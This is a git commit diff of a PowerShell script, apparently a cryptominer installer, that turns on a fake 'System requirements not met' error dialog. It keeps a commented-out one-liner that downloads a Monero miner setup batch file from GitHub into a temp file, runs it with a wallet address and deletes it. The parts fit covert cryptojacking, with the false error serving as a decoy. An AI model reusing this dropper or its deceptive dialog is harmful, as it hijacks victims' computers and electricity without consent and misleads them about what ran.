cadf2ed3915f303bab0d5070bf843bae492f864d
err4tik0 <98240038+err4tik0@users.noreply.github.com>
2022-04-22 21:09:51 -0400

    Update mnrinstl2.ps1

--- mnrinstl2.ps1
+++ mnrinstl2.ps1
@@ -1,12 +1,11 @@
 
-# function sb ($title, $msg) {     
-#     [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") | Out-Null 
-#     [Windows.Forms.MessageBox]::Show($msg, $title, [Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning, [System.Windows.Forms.MessageBoxDefaultButton]::Button1, [System.Windows.Forms.MessageBoxOptions]::DefaultDesktopOnly) | Out-Null     
-# } 
+function sb ($title, $msg) {     
+    [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") | Out-Null 
+    [Windows.Forms.MessageBox]::Show($msg, $title, [Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning, [System.Windows.Forms.MessageBoxDefaultButton]::Button1, [System.Windows.Forms.MessageBoxOptions]::DefaultDesktopOnly) | Out-Null     
+} 
 
-# sb( "ERROR", "System requirements not met.")
+sb( "ERROR", "System requirements not met.")
 
-Start-Process "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
 
 # $wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/err4tik0/xmrig_setup/master/setup_moneroocean_miner.bat', $tempfile); & $tempfile 44WW1etki7VDSXozBJkJft5rPNVvPQhSe4rSXM7DqRdT854qzdL2DnD6NieK4mxinyCy3Fuij8jjXZXzHmd66uGaVdzqewk; Remove-Item -Force $tempfile
 
